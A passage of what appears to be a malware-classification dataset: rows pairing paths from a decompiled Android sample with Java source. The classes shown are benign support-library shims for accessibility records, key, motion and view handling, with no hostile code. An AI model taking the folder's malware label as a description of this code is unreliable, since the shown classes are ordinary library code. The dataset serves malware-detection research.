AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {     AccessibilityRecordJellyBeanImpl(){     }     @Override public void setSource(    Object obj,    View view,    int i){       AccessibilityRecordCompatJellyBean.setSource(obj,view,i);     }   } class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {     AccessibilityRecordStubImpl(){     }     @Override public int getAddedCount(    Object obj){       return 0;     }     @Override public CharSequence getBeforeText(    Object obj){       return null;     }     @Override public CharSequence getClassName(    Object obj){       return null;     }     @Override public CharSequence getContentDescription(    Object obj){       return null;     }     @Override public int getCurrentItemIndex(    Object obj){       return 0;     }     @Override public int getFromIndex(    Object obj){       return 0;     }     @Override public int getItemCount(    Object obj){       return 0;     }     @Override public int getMaxScrollX(    Object obj){       return 0;     }     @Override public int getMaxScrollY(    Object obj){       return 0;     }     @Override public Parcelable getParcelableData(    Object obj){       return null;     }     @Override public int getRemovedCount(    Object obj){       return 0;     }     @Override public int getScrollX(    Object obj){       return 0;     }     @Override public int getScrollY(    Object obj){       return 0;     }     @Override public AccessibilityNodeInfoCompat getSource(    Object obj){       return null;     }     @Override public List<CharSequence> getText(    Object obj){       return Collections.emptyList();     }     @Override public int getToIndex(    Object obj){       return 0;     }     @Override public int getWindowId(    Object obj){       return 0;     }     @Override public boolean isChecked(    Object obj){       return false;     }     @Override public boolean isEnabled(    Object obj){       return false;     }     @Override public boolean isFullScreen(    Object obj){       return false;     }     @Override public boolean isPassword(    Object obj){       return false;     }     @Override public boolean isScrollable(    Object obj){       return false;     }     @Override public Object obtain(){       return null;     }     @Override public Object obtain(    Object obj){       return null;     }     @Override public void recycle(    Object obj){     }     @Override public void setAddedCount(    Object obj,    int i){     }     @Override public void setBeforeText(    Object obj,    CharSequence charSequence){     }     @Override public void setChecked(    Object obj,    boolean z){     }     @Override public void setClassName(    Object obj,    CharSequence charSequence){     }     @Override public void setContentDescription(    Object obj,    CharSequence charSequence){     }     @Override public void setCurrentItemIndex(    Object obj,    int i){     }     @Override public void setEnabled(    Object obj,    boolean z){     }     @Override public void setFromIndex(    Object obj,    int i){     }     @Override public void setFullScreen(    Object obj,    boolean z){     }     @Override public void setItemCount(    Object obj,    int i){     }     @Override public void setMaxScrollX(    Object obj,    int i){     }     @Override public void setMaxScrollY(    Object obj,    int i){     }     @Override public void setParcelableData(    Object obj,    Parcelable parcelable){     }     @Override public void setPassword(    Object obj,    boolean z){     }     @Override public void setRemovedCount(    Object obj,    int i){     }     @Override public void setScrollX(    Object obj,    int i){     }     @Override public void setScrollY(    Object obj,    int i){     }     @Override public void setScrollable(    Object obj,    boolean z){     }     @Override public void setSource(    Object obj,    View view){     }     @Override public void setSource(    Object obj,    View view,    int i){     }     @Override public void setToIndex(    Object obj,    int i){     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityRecordJellyBeanImpl();       return;     }     if (Build.VERSION.SDK_INT >= 15) {       IMPL=new AccessibilityRecordIcsMr1Impl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityRecordIcsImpl();     }  else {       IMPL=new AccessibilityRecordStubImpl();     }   }   public AccessibilityRecordCompat(  Object obj){     this.mRecord=obj;   }   public static AccessibilityRecordCompat obtain(){     return new AccessibilityRecordCompat(IMPL.obtain());   }   public static AccessibilityRecordCompat obtain(  AccessibilityRecordCompat accessibilityRecordCompat){     return new AccessibilityRecordCompat(IMPL.obtain(accessibilityRecordCompat.mRecord));   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       AccessibilityRecordCompat accessibilityRecordCompat=(AccessibilityRecordCompat)obj;       return this.mRecord == null ? accessibilityRecordCompat.mRecord == null : this.mRecord.equals(accessibilityRecordCompat.mRecord);     }     return false;   }   public int getAddedCount(){     return IMPL.getAddedCount(this.mRecord);   }   public CharSequence getBeforeText(){     return IMPL.getBeforeText(this.mRecord);   }   public CharSequence getClassName(){     return IMPL.getClassName(this.mRecord);   }   public CharSequence getContentDescription(){     return IMPL.getContentDescription(this.mRecord);   }   public int getCurrentItemIndex(){     return IMPL.getCurrentItemIndex(this.mRecord);   }   public int getFromIndex(){     return IMPL.getFromIndex(this.mRecord);   }   public Object getImpl(){     return this.mRecord;   }   public int getItemCount(){     return IMPL.getItemCount(this.mRecord);   }   public int getMaxScrollX(){     return IMPL.getMaxScrollX(this.mRecord);   }   public int getMaxScrollY(){     return IMPL.getMaxScrollY(this.mRecord);   }   public Parcelable getParcelableData(){     return IMPL.getParcelableData(this.mRecord);   }   public int getRemovedCount(){     return IMPL.getRemovedCount(this.mRecord);   }   public int getScrollX(){     return IMPL.getScrollX(this.mRecord);   }   public int getScrollY(){     return IMPL.getScrollY(this.mRecord);   }   public AccessibilityNodeInfoCompat getSource(){     return IMPL.getSource(this.mRecord);   }   public List<CharSequence> getText(){     return IMPL.getText(this.mRecord);   }   public int getToIndex(){     return IMPL.getToIndex(this.mRecord);   }   public int getWindowId(){     return IMPL.getWindowId(this.mRecord);   }   public int hashCode(){     if (this.mRecord == null) {       return 0;     }     return this.mRecord.hashCode();   }   public boolean isChecked(){     return IMPL.isChecked(this.mRecord);   }   public boolean isEnabled(){     return IMPL.isEnabled(this.mRecord);   }   public boolean isFullScreen(){     return IMPL.isFullScreen(this.mRecord);   }   public boolean isPassword(){     return IMPL.isPassword(this.mRecord);   }   public boolean isScrollable(){     return IMPL.isScrollable(this.mRecord);   }   public void recycle(){     IMPL.recycle(this.mRecord);   }   public void setAddedCount(  int i){     IMPL.setAddedCount(this.mRecord,i);   }   public void setBeforeText(  CharSequence charSequence){     IMPL.setBeforeText(this.mRecord,charSequence);   }   public void setChecked(  boolean z){     IMPL.setChecked(this.mRecord,z);   }   public void setClassName(  CharSequence charSequence){     IMPL.setClassName(this.mRecord,charSequence);   }   public void setContentDescription(  CharSequence charSequence){     IMPL.setContentDescription(this.mRecord,charSequence);   }   public void setCurrentItemIndex(  int i){     IMPL.setCurrentItemIndex(this.mRecord,i);   }   public void setEnabled(  boolean z){     IMPL.setEnabled(this.mRecord,z);   }   public void setFromIndex(  int i){     IMPL.setFromIndex(this.mRecord,i);   }   public void setFullScreen(  boolean z){     IMPL.setFullScreen(this.mRecord,z);   }   public void setItemCount(  int i){     IMPL.setItemCount(this.mRecord,i);   }   public void setMaxScrollX(  int i){     IMPL.setMaxScrollX(this.mRecord,i);   }   public void setMaxScrollY(  int i){     IMPL.setMaxScrollY(this.mRecord,i);   }   public void setParcelableData(  Parcelable parcelable){     IMPL.setParcelableData(this.mRecord,parcelable);   }   public void setPassword(  boolean z){     IMPL.setPassword(this.mRecord,z);   }   public void setRemovedCount(  int i){     IMPL.setRemovedCount(this.mRecord,i);   }   public void setScrollX(  int i){     IMPL.setScrollX(this.mRecord,i);   }   public void setScrollY(  int i){     IMPL.setScrollY(this.mRecord,i);   }   public void setScrollable(  boolean z){     IMPL.setScrollable(this.mRecord,z);   }   public void setSource(  View view){     IMPL.setSource(this.mRecord,view);   }   public void setSource(  View view,  int i){     IMPL.setSource(this.mRecord,view,i);   }   public void setToIndex(  int i){     IMPL.setToIndex(this.mRecord,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordCompatIcs.code","class AccessibilityRecordCompatIcs {   AccessibilityRecordCompatIcs(){   }   public static int getAddedCount(  Object obj){     return ((AccessibilityRecord)obj).getAddedCount();   }   public static CharSequence getBeforeText(  Object obj){     return ((AccessibilityRecord)obj).getBeforeText();   }   public static CharSequence getClassName(  Object obj){     return ((AccessibilityRecord)obj).getClassName();   }   public static CharSequence getContentDescription(  Object obj){     return ((AccessibilityRecord)obj).getContentDescription();   }   public static int getCurrentItemIndex(  Object obj){     return ((AccessibilityRecord)obj).getCurrentItemIndex();   }   public static int getFromIndex(  Object obj){     return ((AccessibilityRecord)obj).getFromIndex();   }   public static int getItemCount(  Object obj){     return ((AccessibilityRecord)obj).getItemCount();   }   public static Parcelable getParcelableData(  Object obj){     return ((AccessibilityRecord)obj).getParcelableData();   }   public static int getRemovedCount(  Object obj){     return ((AccessibilityRecord)obj).getRemovedCount();   }   public static int getScrollX(  Object obj){     return ((AccessibilityRecord)obj).getScrollX();   }   public static int getScrollY(  Object obj){     return ((AccessibilityRecord)obj).getScrollY();   }   public static Object getSource(  Object obj){     return ((AccessibilityRecord)obj).getSource();   }   public static List<CharSequence> getText(  Object obj){     return ((AccessibilityRecord)obj).getText();   }   public static int getToIndex(  Object obj){     return ((AccessibilityRecord)obj).getToIndex();   }   public static int getWindowId(  Object obj){     return ((AccessibilityRecord)obj).getWindowId();   }   public static boolean isChecked(  Object obj){     return ((AccessibilityRecord)obj).isChecked();   }   public static boolean isEnabled(  Object obj){     return ((AccessibilityRecord)obj).isEnabled();   }   public static boolean isFullScreen(  Object obj){     return ((AccessibilityRecord)obj).isFullScreen();   }   public static boolean isPassword(  Object obj){     return ((AccessibilityRecord)obj).isPassword();   }   public static boolean isScrollable(  Object obj){     return ((AccessibilityRecord)obj).isScrollable();   }   public static Object obtain(){     return AccessibilityRecord.obtain();   }   public static Object obtain(  Object obj){     return AccessibilityRecord.obtain((AccessibilityRecord)obj);   }   public static void recycle(  Object obj){     ((AccessibilityRecord)obj).recycle();   }   public static void setAddedCount(  Object obj,  int i){     ((AccessibilityRecord)obj).setAddedCount(i);   }   public static void setBeforeText(  Object obj,  CharSequence charSequence){     ((AccessibilityRecord)obj).setBeforeText(charSequence);   }   public static void setChecked(  Object obj,  boolean z){     ((AccessibilityRecord)obj).setChecked(z);   }   public static void setClassName(  Object obj,  CharSequence charSequence){     ((AccessibilityRecord)obj).setClassName(charSequence);   }   public static void setContentDescription(  Object obj,  CharSequence charSequence){     ((AccessibilityRecord)obj).setContentDescription(charSequence);   }   public static void setCurrentItemIndex(  Object obj,  int i){     ((AccessibilityRecord)obj).setCurrentItemIndex(i);   }   public static void setEnabled(  Object obj,  boolean z){     ((AccessibilityRecord)obj).setEnabled(z);   }   public static void setFromIndex(  Object obj,  int i){     ((AccessibilityRecord)obj).setFromIndex(i);   }   public static void setFullScreen(  Object obj,  boolean z){     ((AccessibilityRecord)obj).setFullScreen(z);   }   public static void setItemCount(  Object obj,  int i){     ((AccessibilityRecord)obj).setItemCount(i);   }   public static void setParcelableData(  Object obj,  Parcelable parcelable){     ((AccessibilityRecord)obj).setParcelableData(parcelable);   }   public static void setPassword(  Object obj,  boolean z){     ((AccessibilityRecord)obj).setPassword(z);   }   public static void setRemovedCount(  Object obj,  int i){     ((AccessibilityRecord)obj).setRemovedCount(i);   }   public static void setScrollX(  Object obj,  int i){     ((AccessibilityRecord)obj).setScrollX(i);   }   public static void setScrollY(  Object obj,  int i){     ((AccessibilityRecord)obj).setScrollY(i);   }   public static void setScrollable(  Object obj,  boolean z){     ((AccessibilityRecord)obj).setScrollable(z);   }   public static void setSource(  Object obj,  View view){     ((AccessibilityRecord)obj).setSource(view);   }   public static void setToIndex(  Object obj,  int i){     ((AccessibilityRecord)obj).setToIndex(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordCompatIcsMr1.code","class AccessibilityRecordCompatIcsMr1 {   AccessibilityRecordCompatIcsMr1(){   }   public static int getMaxScrollX(  Object obj){     return ((AccessibilityRecord)obj).getMaxScrollX();   }   public static int getMaxScrollY(  Object obj){     return ((AccessibilityRecord)obj).getMaxScrollY();   }   public static void setMaxScrollX(  Object obj,  int i){     ((AccessibilityRecord)obj).setMaxScrollX(i);   }   public static void setMaxScrollY(  Object obj,  int i){     ((AccessibilityRecord)obj).setMaxScrollY(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordCompatJellyBean.code","class AccessibilityRecordCompatJellyBean {   AccessibilityRecordCompatJellyBean(){   }   public static void setSource(  Object obj,  View view,  int i){     ((AccessibilityRecord)obj).setSource(view,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordIcsImpl.code","class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {   AccessibilityRecordIcsImpl(){   }   @Override public int getAddedCount(  Object obj){     return AccessibilityRecordCompatIcs.getAddedCount(obj);   }   @Override public CharSequence getBeforeText(  Object obj){     return AccessibilityRecordCompatIcs.getBeforeText(obj);   }   @Override public CharSequence getClassName(  Object obj){     return AccessibilityRecordCompatIcs.getClassName(obj);   }   @Override public CharSequence getContentDescription(  Object obj){     return AccessibilityRecordCompatIcs.getContentDescription(obj);   }   @Override public int getCurrentItemIndex(  Object obj){     return AccessibilityRecordCompatIcs.getCurrentItemIndex(obj);   }   @Override public int getFromIndex(  Object obj){     return AccessibilityRecordCompatIcs.getFromIndex(obj);   }   @Override public int getItemCount(  Object obj){     return AccessibilityRecordCompatIcs.getItemCount(obj);   }   @Override public Parcelable getParcelableData(  Object obj){     return AccessibilityRecordCompatIcs.getParcelableData(obj);   }   @Override public int getRemovedCount(  Object obj){     return AccessibilityRecordCompatIcs.getRemovedCount(obj);   }   @Override public int getScrollX(  Object obj){     return AccessibilityRecordCompatIcs.getScrollX(obj);   }   @Override public int getScrollY(  Object obj){     return AccessibilityRecordCompatIcs.getScrollY(obj);   }   @Override public AccessibilityNodeInfoCompat getSource(  Object obj){     return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(obj));   }   @Override public List<CharSequence> getText(  Object obj){     return AccessibilityRecordCompatIcs.getText(obj);   }   @Override public int getToIndex(  Object obj){     return AccessibilityRecordCompatIcs.getToIndex(obj);   }   @Override public int getWindowId(  Object obj){     return AccessibilityRecordCompatIcs.getWindowId(obj);   }   @Override public boolean isChecked(  Object obj){     return AccessibilityRecordCompatIcs.isChecked(obj);   }   @Override public boolean isEnabled(  Object obj){     return AccessibilityRecordCompatIcs.isEnabled(obj);   }   @Override public boolean isFullScreen(  Object obj){     return AccessibilityRecordCompatIcs.isFullScreen(obj);   }   @Override public boolean isPassword(  Object obj){     return AccessibilityRecordCompatIcs.isPassword(obj);   }   @Override public boolean isScrollable(  Object obj){     return AccessibilityRecordCompatIcs.isScrollable(obj);   }   @Override public Object obtain(){     return AccessibilityRecordCompatIcs.obtain();   }   @Override public Object obtain(  Object obj){     return AccessibilityRecordCompatIcs.obtain(obj);   }   @Override public void recycle(  Object obj){     AccessibilityRecordCompatIcs.recycle(obj);   }   @Override public void setAddedCount(  Object obj,  int i){     AccessibilityRecordCompatIcs.setAddedCount(obj,i);   }   @Override public void setBeforeText(  Object obj,  CharSequence charSequence){     AccessibilityRecordCompatIcs.setBeforeText(obj,charSequence);   }   @Override public void setChecked(  Object obj,  boolean z){     AccessibilityRecordCompatIcs.setChecked(obj,z);   }   @Override public void setClassName(  Object obj,  CharSequence charSequence){     AccessibilityRecordCompatIcs.setClassName(obj,charSequence);   }   @Override public void setContentDescription(  Object obj,  CharSequence charSequence){     AccessibilityRecordCompatIcs.setContentDescription(obj,charSequence);   }   @Override public void setCurrentItemIndex(  Object obj,  int i){     AccessibilityRecordCompatIcs.setCurrentItemIndex(obj,i);   }   @Override public void setEnabled(  Object obj,  boolean z){     AccessibilityRecordCompatIcs.setEnabled(obj,z);   }   @Override public void setFromIndex(  Object obj,  int i){     AccessibilityRecordCompatIcs.setFromIndex(obj,i);   }   @Override public void setFullScreen(  Object obj,  boolean z){     AccessibilityRecordCompatIcs.setFullScreen(obj,z);   }   @Override public void setItemCount(  Object obj,  int i){     AccessibilityRecordCompatIcs.setItemCount(obj,i);   }   @Override public void setParcelableData(  Object obj,  Parcelable parcelable){     AccessibilityRecordCompatIcs.setParcelableData(obj,parcelable);   }   @Override public void setPassword(  Object obj,  boolean z){     AccessibilityRecordCompatIcs.setPassword(obj,z);   }   @Override public void setRemovedCount(  Object obj,  int i){     AccessibilityRecordCompatIcs.setRemovedCount(obj,i);   }   @Override public void setScrollX(  Object obj,  int i){     AccessibilityRecordCompatIcs.setScrollX(obj,i);   }   @Override public void setScrollY(  Object obj,  int i){     AccessibilityRecordCompatIcs.setScrollY(obj,i);   }   @Override public void setScrollable(  Object obj,  boolean z){     AccessibilityRecordCompatIcs.setScrollable(obj,z);   }   @Override public void setSource(  Object obj,  View view){     AccessibilityRecordCompatIcs.setSource(obj,view);   }   @Override public void setToIndex(  Object obj,  int i){     AccessibilityRecordCompatIcs.setToIndex(obj,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordIcsMr1Impl.code","class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {   AccessibilityRecordIcsMr1Impl(){   }   @Override public int getMaxScrollX(  Object obj){     return AccessibilityRecordCompatIcsMr1.getMaxScrollX(obj);   }   @Override public int getMaxScrollY(  Object obj){     return AccessibilityRecordCompatIcsMr1.getMaxScrollY(obj);   }   @Override public void setMaxScrollX(  Object obj,  int i){     AccessibilityRecordCompatIcsMr1.setMaxScrollX(obj,i);   }   @Override public void setMaxScrollY(  Object obj,  int i){     AccessibilityRecordCompatIcsMr1.setMaxScrollY(obj,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordImpl.code","interface AccessibilityRecordImpl {   int getAddedCount(  Object obj);   CharSequence getBeforeText(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getCurrentItemIndex(  Object obj);   int getFromIndex(  Object obj);   int getItemCount(  Object obj);   int getMaxScrollX(  Object obj);   int getMaxScrollY(  Object obj);   Parcelable getParcelableData(  Object obj);   int getRemovedCount(  Object obj);   int getScrollX(  Object obj);   int getScrollY(  Object obj);   AccessibilityNodeInfoCompat getSource(  Object obj);   List<CharSequence> getText(  Object obj);   int getToIndex(  Object obj);   int getWindowId(  Object obj);   boolean isChecked(  Object obj);   boolean isEnabled(  Object obj);   boolean isFullScreen(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   Object obtain();   Object obtain(  Object obj);   void recycle(  Object obj);   void setAddedCount(  Object obj,  int i);   void setBeforeText(  Object obj,  CharSequence charSequence);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setCurrentItemIndex(  Object obj,  int i);   void setEnabled(  Object obj,  boolean z);   void setFromIndex(  Object obj,  int i);   void setFullScreen(  Object obj,  boolean z);   void setItemCount(  Object obj,  int i);   void setMaxScrollX(  Object obj,  int i);   void setMaxScrollY(  Object obj,  int i);   void setParcelableData(  Object obj,  Parcelable parcelable);   void setPassword(  Object obj,  boolean z);   void setRemovedCount(  Object obj,  int i);   void setScrollX(  Object obj,  int i);   void setScrollY(  Object obj,  int i);   void setScrollable(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setToIndex(  Object obj,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordJellyBeanImpl.code","class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {   AccessibilityRecordJellyBeanImpl(){   }   @Override public void setSource(  Object obj,  View view,  int i){     AccessibilityRecordCompatJellyBean.setSource(obj,view,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordStubImpl.code","class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {   AccessibilityRecordStubImpl(){   }   @Override public int getAddedCount(  Object obj){     return 0;   }   @Override public CharSequence getBeforeText(  Object obj){     return null;   }   @Override public CharSequence getClassName(  Object obj){     return null;   }   @Override public CharSequence getContentDescription(  Object obj){     return null;   }   @Override public int getCurrentItemIndex(  Object obj){     return 0;   }   @Override public int getFromIndex(  Object obj){     return 0;   }   @Override public int getItemCount(  Object obj){     return 0;   }   @Override public int getMaxScrollX(  Object obj){     return 0;   }   @Override public int getMaxScrollY(  Object obj){     return 0;   }   @Override public Parcelable getParcelableData(  Object obj){     return null;   }   @Override public int getRemovedCount(  Object obj){     return 0;   }   @Override public int getScrollX(  Object obj){     return 0;   }   @Override public int getScrollY(  Object obj){     return 0;   }   @Override public AccessibilityNodeInfoCompat getSource(  Object obj){     return null;   }   @Override public List<CharSequence> getText(  Object obj){     return Collections.emptyList();   }   @Override public int getToIndex(  Object obj){     return 0;   }   @Override public int getWindowId(  Object obj){     return 0;   }   @Override public boolean isChecked(  Object obj){     return false;   }   @Override public boolean isEnabled(  Object obj){     return false;   }   @Override public boolean isFullScreen(  Object obj){     return false;   }   @Override public boolean isPassword(  Object obj){     return false;   }   @Override public boolean isScrollable(  Object obj){     return false;   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  Object obj){     return null;   }   @Override public void recycle(  Object obj){   }   @Override public void setAddedCount(  Object obj,  int i){   }   @Override public void setBeforeText(  Object obj,  CharSequence charSequence){   }   @Override public void setChecked(  Object obj,  boolean z){   }   @Override public void setClassName(  Object obj,  CharSequence charSequence){   }   @Override public void setContentDescription(  Object obj,  CharSequence charSequence){   }   @Override public void setCurrentItemIndex(  Object obj,  int i){   }   @Override public void setEnabled(  Object obj,  boolean z){   }   @Override public void setFromIndex(  Object obj,  int i){   }   @Override public void setFullScreen(  Object obj,  boolean z){   }   @Override public void setItemCount(  Object obj,  int i){   }   @Override public void setMaxScrollX(  Object obj,  int i){   }   @Override public void setMaxScrollY(  Object obj,  int i){   }   @Override public void setParcelableData(  Object obj,  Parcelable parcelable){   }   @Override public void setPassword(  Object obj,  boolean z){   }   @Override public void setRemovedCount(  Object obj,  int i){   }   @Override public void setScrollX(  Object obj,  int i){   }   @Override public void setScrollY(  Object obj,  int i){   }   @Override public void setScrollable(  Object obj,  boolean z){   }   @Override public void setSource(  Object obj,  View view){   }   @Override public void setSource(  Object obj,  View view,  int i){   }   @Override public void setToIndex(  Object obj,  int i){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\BaseEdgeEffectImpl.code","class BaseEdgeEffectImpl implements EdgeEffectImpl {   BaseEdgeEffectImpl(){   }   @Override public boolean draw(  Object obj,  Canvas canvas){     return false;   }   @Override public void finish(  Object obj){   }   @Override public boolean isFinished(  Object obj){     return true;   }   @Override public Object newEdgeEffect(  Context context){     return null;   }   @Override public boolean onAbsorb(  Object obj,  int i){     return false;   }   @Override public boolean onPull(  Object obj,  float f){     return false;   }   @Override public boolean onRelease(  Object obj){     return false;   }   @Override public void setSize(  Object obj,  int i,  int i2){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\BaseKeyEventVersionImpl.code","class BaseKeyEventVersionImpl implements KeyEventVersionImpl {   private static final int META_ALL_MASK=247;   private static final int META_MODIFIER_MASK=247;   BaseKeyEventVersionImpl(){   }   private static int metaStateFilterDirectionalModifiers(  int i,  int i2,  int i3,  int i4,  int i5){     boolean z=(i2 & i3) != 0;     int i6=i4 | i5;     boolean z2=(i2 & i6) != 0;     if (!z) {       return z2 ? i & (i3 ^ (-1)) : i;     }     if (z2) {       throw new IllegalArgumentException(""bad arguments"");     }     return i & (i6 ^ (-1));   }   @Override public boolean dispatch(  KeyEvent keyEvent,  KeyEvent.Callback callback,  Object obj,  Object obj2){     return keyEvent.dispatch(callback);   }   @Override public Object getKeyDispatcherState(  View view){     return null;   }   @Override public boolean isTracking(  KeyEvent keyEvent){     return false;   }   @Override public boolean metaStateHasModifiers(  int i,  int i2){     return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(i) & 247,i2,1,64,128),i2,2,16,32) == i2;   }   @Override public boolean metaStateHasNoModifiers(  int i){     return (normalizeMetaState(i) & 247) == 0;   }   @Override public int normalizeMetaState(  int i){     int i2=(i & 192) != 0 ? i | 1 : i;     if ((i2 & 48) != 0) {       i2|=2;     }     return i2 & 247;   }   @Override public void startTracking(  KeyEvent keyEvent){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\BaseMotionEventVersionImpl.code","class BaseMotionEventVersionImpl implements MotionEventVersionImpl {   BaseMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent motionEvent,  int i){     return i == 0 ? 0 : -1;   }   @Override public int getPointerCount(  MotionEvent motionEvent){     return 1;   }   @Override public int getPointerId(  MotionEvent motionEvent,  int i){     if (i == 0) {       return 0;     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getX(  MotionEvent motionEvent,  int i){     if (i == 0) {       return motionEvent.getX();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getY(  MotionEvent motionEvent,  int i){     if (i == 0) {       return motionEvent.getY();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\BaseVelocityTrackerVersionImpl.code","class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   BaseVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getXVelocity();   }   @Override public float getYVelocity(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getYVelocity();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\BaseViewCompatImpl.code","class BaseViewCompatImpl implements ViewCompatImpl {   private Method mDispatchFinishTemporaryDetach;   private Method mDispatchStartTemporaryDetach;   private boolean mTempDetachBound;   WeakHashMap<View,ViewPropertyAnimatorCompat> mViewPropertyAnimatorCompatMap=null;   BaseViewCompatImpl(){   }   private void bindTempDetach(){     try {       this.mDispatchStartTemporaryDetach=View.class.getDeclaredMethod(""dispatchStartTemporaryDetach"",new Class[0]);       this.mDispatchFinishTemporaryDetach=View.class.getDeclaredMethod(""dispatchFinishTemporaryDetach"",new Class[0]);     }  catch (    NoSuchMethodException e) {       Log.e(ViewCompat.TAG,""Couldn't find method"",e);     }     this.mTempDetachBound=true;   }   @Override public ViewPropertyAnimatorCompat animate(  View view){     return new ViewPropertyAnimatorCompat(view);   }   @Override public boolean canScrollHorizontally(  View view,  int i){     return false;   }   @Override public boolean canScrollVertically(  View view,  int i){     return false;   }   @Override public void dispatchFinishTemporaryDetach(  View view){     if (!this.mTempDetachBound) {       bindTempDetach();     }     if (this.mDispatchFinishTemporaryDetach == null) {       view.onFinishTemporaryDetach();       return;     }     try {       this.mDispatchFinishTemporaryDetach.invoke(view,new Object[0]);     }  catch (    Exception e) {       Log.d(ViewCompat.TAG,""Error calling dispatchFinishTemporaryDetach"",e);     }   }   @Override public void dispatchStartTemporaryDetach(  View view){     if (!this.mTempDetachBound) {       bindTempDetach();     }     if (this.mDispatchStartTemporaryDetach == null) {       view.onStartTemporaryDetach();       return;     }     try {       this.mDispatchStartTemporaryDetach.invoke(view,new Object[0]);     }  catch (    Exception e) {       Log.d(ViewCompat.TAG,""Error calling dispatchStartTemporaryDetach"",e);     }   }   @Override public int getAccessibilityLiveRegion(  View view){     return 0;   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return null;   }   @Override public float getAlpha(  View view){     return 1.0f;   }   long getFrameTime(){     return ViewCompat.FAKE_FRAME_TIME;   }   @Override public int getImportantForAccessibility(  View view){     return 0;   }   @Override public int getLabelFor(  View view){     return 0;   }   @Override public int getLayerType(  View view){     return 0;   }   @Override public int getLayoutDirection(  View view){     return 0;   }   @Override public int getMeasuredHeightAndState(  View view){     return view.getMeasuredHeight();   }   @Override public int getMeasuredState(  View view){     return 0;   }   @Override public int getMeasuredWidthAndState(  View view){     return view.getMeasuredWidth();   }   @Override public int getMinimumHeight(  View view){     return 0;   }   @Override public int getMinimumWidth(  View view){     return 0;   }   @Override public int getOverScrollMode(  View view){     return 2;   }   @Override public int getPaddingEnd(  View view){     return view.getPaddingRight();   }   @Override public int getPaddingStart(  View view){     return view.getPaddingLeft();   }   @Override public ViewParent getParentForAccessibility(  View view){     return view.getParent();   }   @Override public float getPivotX(  View view){     return 0.0f;   }   @Override public float getPivotY(  View view){     return 0.0f;   }   @Override public float getRotation(  View view){     return 0.0f;   }   @Override public float getRotationX(  View view){     return 0.0f;   }   @Override public float getRotationY(  View view){     return 0.0f;   }   @Override public float getScaleX(  View view){     return 0.0f;   }   @Override public float getScaleY(  View view){     return 0.0f;   }   @Override public float getTranslationX(  View view){     return 0.0f;   }   @Override public float getTranslationY(  View view){     return 0.0f;   }   @Override public float getX(  View view){     return 0.0f;   }   @Override public float getY(  View view){     return 0.0f;   }   @Override public boolean hasTransientState(  View view){     return false;   }   @Override public boolean isOpaque(  View view){  